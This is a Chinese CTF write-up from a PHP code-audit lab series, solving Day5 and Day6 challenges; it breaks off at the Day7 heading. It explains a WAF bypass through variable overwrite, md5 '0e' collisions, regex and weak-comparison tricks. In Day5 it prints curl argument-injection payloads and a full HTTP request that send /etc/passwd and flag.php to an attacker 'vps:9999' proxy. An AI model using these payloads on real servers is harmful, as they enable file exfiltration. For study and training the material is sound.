## 前言
大家好，我们是红日安全-代码审计小组。最近我们小组正在做一个PHP代码审计的项目，供大家学习交流，我们给这个项目起了一个名字叫 [ **PHP-Audit-Labs** ](https://github.com/hongriSec/PHP-Audit-Labs)
。在每篇文章的最后，我们都留了一道CTF题目，供大家练习。下面是 **Day5-Day8** 的题解：
## Day5题解：(By l1nk3r)
题目如下：
这道题主要考察全局变量覆盖，结合 **unset** 函数绕过waf，以及通过 **curl** 读取文件，接下来我们将代码分为两个部分看看吧。
### 第一部分：
我们看到 **第11行-14行** 有这样一串代码：
分析一下这串代码的逻辑：
首先 **第一行** ，循环获取字符串 **GET、POST、COOKIE** ，并依次赋值给变量 **$__R** 。在 **第二行** 中先判断
**$$__R** 变量是否存在数据，如果存在，则继续判断超全局数组 **GET、POST、COOKIE**
中是否存在键值相等的，如果存在，则删除该变量。这里有个 **可变变量** 的概念需要先理解一下。
> 可变变量指的是：一个变量的变量名可以动态的设置和使用。一个可变变量获取了一个普通变量的值作为其变量名。
举个例子方便理解：
这里使用 **$$** 将通过 **变量a** 获取到的数据，注册成为一个 **新的变量** （这里是 **变量hello** ）。然后会发现变量
**$$a** 的输出数据和变量 **$hello** 的输出数据一致（如上图，输出为 **world** ）。
我通过 **GET** 请求向 **index.php** 提交 **flag=test** ，接着通过 **POST** 请求提交
**_GET[flag]=test** 。当开始遍历 **$_POST** 超全局数组的时候， **$__k** 代表 **_GET[flag]** ，所以
**$$__k** 就是 **$_GET[flag]** ，即 **test** 值，此时 **$$__k** == **$__v** 成立，变量
**$_GET[flag]** 就被 **unset** 了。但是在 **第21行** 和 **22行** 有这样一串代码：
    if($_POST) extract($_POST, EXTR_SKIP);
    if($_GET) extract($_GET, EXTR_SKIP);
**extract** 函数的作用是将对象内的键名变成一个变量名，而这个变量对应的值就是这个键名的值， **EXTR_SKIP**
参数表示如果前面存在此变量，不对前面的变量进行覆盖处理。由于我们前面通过 **POST** 请求提交 **_GET[flag]=test**
，所以这里会变成 **$_GET[flag]=test** ，这里的 **$_GET** 变量就不需要再经过 **waf** 函数检测了，也就绕过了
**preg_match('/flag/i',$key)** 的限制。下面举个 **extract** 函数用例：
接着到了24行比较两个变量的md5值，我们构造出2个0e开头的md5即可绕过，这样就进入第二阶段。
### 第二部分
第二阶段主要考察 **curl** 读取文件。这里主要加了两个坑，我们之前说过的两个函数 **escapeshellarg()** 和
**escapeshellcmd()** 一起使用的时候会造成的问题，主要看看这部分代码。
这里的 **第8行** 和 **第9行** 增加了两个过滤。
  * **escapeshellarg** ，将给字符串增加一个单引号并且能引用或者转码任何已经存在的单引号
  * **escapeshellcmd** ，会对以下的字符进行转义&#;`|*?~<>^()[]{}$`, `x0A` 和 `xFF`, `'` 和 `"`仅在不配对儿的时候被转义。
在字符串增加了引号同时会进行转义，那么之前的payload
    http://127.0.0.1/index1.php?url=http://127.0.0.1 -T /etc/passwd
因为增加了 **'** 进行了转义，所以整个字符串会被当成参数。注意 **escapeshellcmd** 的问题是在于如果 **'** 和 **"**
仅在不配对儿的时候被转义。那么如果我们多增加一个 **'** 就可以扰乱之前的转义了。如下：
在 **curl** 中存在 **-F** 提交表单的方法，也可以提交文件。 **-F ** 向服务器POST表单，例如：
**curl -F "web=@index.html;type=text/html" url.com**
。提交文件之后，利用代理的方式进行监听，这样就可以截获到文件了,同时还不受最后的的影响。那么最后的payload为：
    http://baidu.com/' -F file=@/etc/passwd -x  vps:9999
这里应该是和 **curl** 版本有关系，我在 **7.54.0** 下没有测试成功。
题目中的 **curl** 版本是 **7.19.7**
根据猜测，可能在是新版本中，先会执行 **curl http** 的操作，但是由于在后面增加了,例如 ****
但是curl无法找到这样的文件，出现404。出现404之后，后面的提交文件的操作就不进行了，程序就退出了。这样在vps上面就无法接受到文件了。
### 解题payload：
所以这题最后的 **payload** 是这样的。
    POST /index.php?flag=QNKCDZO&hongri=s878926199a&url=http://baidu.com/' -F file=@/var/www/html/flag.php -x  vps:9999 HTTP/1.1
    Host: 127.0.0.1
    Cache-Control: max-age=0
    Upgrade-Insecure-Requests: 1
    User-Agent: Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/59.0.3071.86 Safari/537.36
    Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8
    Accept-Language: zh-CN,zh;q=0.8
    Cookie: PHPSESSID=om11lglr53tm1htliteav4uhk4
    Connection: close
    Content-Type: application/x-www-form-urlencoded
    Content-Length: 112
    _GET[flag]=QNKCDZO&_GET[hongri]=s878926199a&_GET[url]=http://baidu.com/' -F file=@/var/www/html/flag.php -x  vps:9999
## Day6题解：(By 七月火)
题目如下：
这道题目实际上考察的是大家是否熟悉PHP正则表达式的字符类，当然还涉及到一些弱类型比较问题。大家可以先查阅一下PHP手册对这些字符类的定义，具体可点
[这里](http://php.net/manual/zh/regexp.reference.character-classes.php) 。
_alnum_ | 字母和数字  
---|---  
_alpha_ | 字母  
_ascii_ | 0 - 127的ascii字符  
_blank_ | 空格和水平制表符  
_cntrl_ | 控制字符  
_digit_ | 十进制数(same as \d)  
_graph_ | 打印字符, 不包括空格  
_lower_ | 小写字母  
_print_ | 打印字符,包含空格  
_punct_ | 打印字符, 不包括字母和数字  
_space_ | 空白字符 (比\s多垂直制表符)  
_upper_ | 大写字母  
_word_ | 单词字符(same as \w)  
_xdigit_ | 十六进制数字  
题目中总共有三处正则匹配，我们分别来看一下其对应的含义。第一处的正则 **/^[[:graph:]]{12,}$/**
为：匹配到可打印字符12个以上(包含12)， **^** 号表示必须以某类字符开头， **$** 号表示必须以某类字符结尾。第二处正则表达式：
    $reg = '/([[:punct:]]+|[[:digit:]]+|[[:upper:]]+|[[:lower:]]+)/';
    if (6 > preg_match_all($reg, $password, $arr))
        break;
表示字符串中，把连续的符号、数字、大写、小写，作为一段，至少分六段，例如我们输入 **H0ng+Ri** 则匹配到的子串为 **H 0 ng + R i**
。第三处的正则表达式：
    $ps = array('punct', 'digit', 'upper', 'lower');
    foreach ($ps as $pt)
    {
        if (preg_match("/[[:$pt:]]+/", $password))
        $c += 1;
    }
    if ($c < 3) break;
表示为输入的字符串至少含有符号、数字、大写、小写中的三种类型。然后题目最后将 **$password** 与42进行了弱比较。所以我们的payload为：
    password=42.00e+00000
    password=420.00000e-1
网络上还有一种解法是： **password=\x34\x32\x2E** ，但是这种解法并不可行，大家可以思考一下为什么。
PS：在 [代码审计Day6 - 正则使用不当导致的路径穿越问题](https://xz.aliyun.com/t/2523)
的文章评论下面，我们提及了一个经典的通过正则写配置文件的案例，这个案例具体怎么绕过并写入shell，大家可以参考 [ **这里**
](https://github.com/wonderkun/CTF_web/tree/dcf36cb9ba9a580a4e8d92b43480b6575fed2c3a/web200-7)
。
## Day7题解：(By l1nk3r)
题目如下：